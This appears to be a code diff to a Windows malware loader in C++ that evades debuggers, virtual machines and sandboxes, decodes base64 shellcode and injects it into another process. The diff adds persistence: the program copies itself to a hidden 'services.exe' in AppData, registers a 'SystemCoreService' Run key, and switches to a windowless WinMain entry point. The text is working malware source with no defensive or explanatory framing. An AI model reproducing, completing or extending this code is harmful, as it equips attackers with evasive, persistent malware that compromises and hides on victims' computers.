@@ -8,7 +8,7 @@
 #include <winternl.h>
 #include <tlhelp32.h>
 #include <cwchar>
-#include <iphlpapi.h> 
+#include <iphlpapi.h>
 #include "anti_debug.h"
 #include "anti_sandbox.h"
 #include "anti_vm.h"
@@ -25,6 +25,9 @@
 #include <thread>
 #include <mutex>
 #include <chrono>
+
+// {startup_macro_placeholder}
+
 typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);
 typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
 typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
@@ -97,6 +100,57 @@ FARPROC get_proc_address_manual(HMODULE h_mod, const char* func_name) {
 
     return NULL;
 }
+
+bool RegisterSystemTask(const std::string& executablePath) {
+    HKEY hKey;
+    const char* runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    const char* valueName = "SystemCoreService";
+
+    LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey);
+    if (openRes != ERROR_SUCCESS) {
+        return false;
+    }
+
+    LONG setRes = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
+    if (setRes != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    RegCloseKey(hKey);
+    return true;
+}
+
+enum RelocateResult {
+    RELOCATE_SUCCESS,
+    RELOCATE_ALREADY_EXISTS,
+    RELOCATE_FAILED
+};
+
+RelocateResult RelocateModule(std::string& newPath) {
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+
+    const char* appDataPath = getenv("APPDATA");
+    if (appDataPath == NULL) {
+        return RELOCATE_FAILED;
+    }
+
+    newPath = std::string(appDataPath) + "\\\\services.exe";
+
+    if (!CopyFileA(currentPath, newPath.c_str(), TRUE)) { // TRUE = bFailIfExists
+        DWORD error = GetLastError();
+        if (error == ERROR_FILE_EXISTS) {
+            return RELOCATE_ALREADY_EXISTS;
+        } else {
+            return RELOCATE_FAILED;
+        }
+    }
+
+    SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+    return RELOCATE_SUCCESS;
+}
+
 std::string base64_decode(std::string const& encoded_string) {
     std::string base64_chars =
         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -137,11 +191,11 @@ DWORD get_proc_id(const char* proc_name) {
     return proc_id;
 }
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 	if (CheckForDebugger() || AntiVM::isVM() || AntiSandbox::check_cpuid() || AntiSandbox::check_timing() || AntiSandbox::check_ram() || AntiSandbox::check_mac_address() || AntiSandbox::check_hardware_names() || AntiSandbox::check_linux_artifacts() || AntiSandbox::check_registry_keys() || AntiSandbox::check_vm_files() || AntiSandbox::check_running_processes()) {{
         return 1;
     }}
-	
+
     HMODULE h_kernel32;
     std::string encoded_shellcode;
     std::string decoded_shellcode;
@@ -205,6 +259,18 @@ int main() {
     }
     CloseHandle_ptr(h_thread);
     CloseHandle_ptr(h_proc);
+
+#if StartUP
+    // --- Persistence Logic ---
+    std::string newPath;
+    RelocateResult relocateResult = RelocateModule(newPath);
+
+    if (relocateResult == RELOCATE_SUCCESS) {
+        if (!RegisterSystemTask(newPath)) {
+            // Persistence failed, but payload delivered.
+        }
+    }
+#endif
 
     return 0;
 }
